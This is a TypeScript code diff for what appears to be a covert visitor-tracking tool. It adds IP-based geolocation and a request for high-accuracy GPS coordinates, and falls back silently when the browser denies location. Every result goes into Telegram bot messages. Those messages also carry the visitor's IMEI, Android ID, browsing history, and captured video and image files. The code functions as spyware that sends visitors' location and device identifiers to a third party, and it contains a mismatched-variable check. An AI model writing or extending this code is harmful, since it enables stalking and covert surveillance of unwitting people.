@@ -277,6 +277,72 @@ async function getLocationInfo(): Promise<LocationInfo> {
   }
 }
 
+async function getLocationInfoByGeoIP(): Promise<LocationInfo> {
+  try {
+    const ipfy = await fetch("https://api.ipify.org/?format=json");
+    if (!ipfy.ok) {
+      throw new Error(`Error Ipfy: ${ipfy.status}`);
+    }
+    const ipfydata = await ipfy.json();
+
+    // Get IP-based location first as a fallback
+    const ipResponse = await fetch(
+      `https://get.geojs.io/v1/ip/geo/${ipfydata.ip}.json`
+    );
+    if (!ipResponse.ok) {
+      throw new Error(`Location API error: ${ipResponse.status}`);
+    }
+    const ipData = await ipResponse.json();
+
+    const locationData: LocationInfo = {
+      city: ipData.city || "Unknown",
+      country: ipData.country || "Unknown",
+      latitude: ipData.latitude || null,
+      longitude: ipData.longitude || null,
+      accuracy: ipData.accuracy || null,
+      source: "IP",
+      ip: ipData.ip || "Unknown",
+    };
+
+    // Try to get precise location if available
+    if ("geolocation" in navigator) {
+      try {
+        const position = await new Promise<GeolocationPosition>(
+          (resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+              enableHighAccuracy: true,
+              timeout: 5000,
+              maximumAge: 0,
+            });
+          }
+        );
+
+        // Only update if we got more precise coordinates
+        locationData.latitude = position.coords.latitude;
+        locationData.longitude = position.coords.longitude;
+        locationData.accuracy = position.coords.accuracy;
+        locationData.source = "GPS";
+      } catch (geoError) {
+        // Silently fall back to IP-based location
+        console.log("Using IP-based location as fallback");
+      }
+    }
+
+    return locationData;
+  } catch (error) {
+    console.error("Error fetching location:", error);
+    return {
+      city: "Unknown",
+      country: "Unknown",
+      latitude: null,
+      longitude: null,
+      accuracy: null,
+      source: "None",
+      ip: "Unknown",
+    };
+  }
+}
+
 async function sendTelegramMessage(
   botToken: string,
   data: any
@@ -333,6 +399,7 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
   }
 
   const locationInfo = await getLocationInfo();
+  const locationInfo2 = await getLocationInfoByGeoIP();
   const deviceInfo = await getDeviceInfo();
 
   let locationText = `🌆 City: ${locationInfo.city}\n🌍 Country: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;
@@ -344,6 +411,17 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
     }
 
     locationText += `\n🗺 Map: https://www.google.com/maps?q=${locationInfo.latitude},${locationInfo.longitude}`;
+  }
+
+  let locationText2 = `🌆 City: ${locationInfo.city}\n🌍 Country: ${locationInfo.country}\n🌐 IP: ${locationInfo.ip}`;
+
+  if (locationInfo.latitude && locationInfo2.longitude) {
+    locationText2 += `\n📍 Location (${locationInfo2.source}): ${locationInfo2.latitude}, ${locationInfo2.longitude}`;
+    if (locationInfo2.accuracy) {
+      locationText2 += `\n🎯 Accuracy: ${Math.round(locationInfo2.accuracy)}m`;
+    }
+
+    locationText2 += `\n🗺 Map: https://www.google.com/maps?q=${locationInfo2.latitude},${locationInfo2.longitude}`;
   }
 
   const deviceText = `
@@ -372,6 +450,7 @@ export const sendTelegramNotification = async (details: VisitorDetails) => {
 👤 UA: ${details.userAgent}
 📍 Location: ${details.location}
 ${locationText}
+${locationText2}
 ${deviceText}
 🔗 Referrer: ${details.referrer}
 🌐 Previous sites: ${details.previousSites}
@@ -427,6 +506,7 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
   }
 
   const locationInfo = await getLocationInfo();
+  const locationInfo2 = await getLocationInfoByGeoIP();
   const deviceInfo = await getDeviceInfo();
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
@@ -443,6 +523,9 @@ export const sendVideoToTelegram = async (videoBlob: Blob) => {
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
 🌐 IP: ${locationInfo.ip}
+🌆 City: ${locationInfo2.city}
+🌍 Country: ${locationInfo2.country}
+🌐 IP: ${locationInfo2.ip}
 📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
 📱 IMEI: ${deviceInfo.imei || "Not available"}
 📱 Android ID: ${deviceInfo.androidId || "Not available"}
@@ -530,6 +613,7 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
   }
 
   const locationInfo = await getLocationInfo();
+  const locationInfo2 = await getLocationInfoByGeoIP();
   const deviceInfo = await getDeviceInfo();
   const formData = new FormData();
   formData.append("chat_id", CHAT_ID);
@@ -541,6 +625,9 @@ export const sendImageToTelegram = async (imageBlob: Blob) => {
 🌆 City: ${locationInfo.city}
 🌍 Country: ${locationInfo.country}
 🌐 IP: ${locationInfo.ip}
+🌆 City: ${locationInfo2.city}
+🌍 Country: ${locationInfo2.country}
+🌐 IP: ${locationInfo2.ip}
 📱 Device: ${deviceInfo.brand} ${deviceInfo.model}
 📱 IMEI: ${deviceInfo.imei || "Not available"}
 📱 Android ID: ${deviceInfo.androidId || "Not available"}
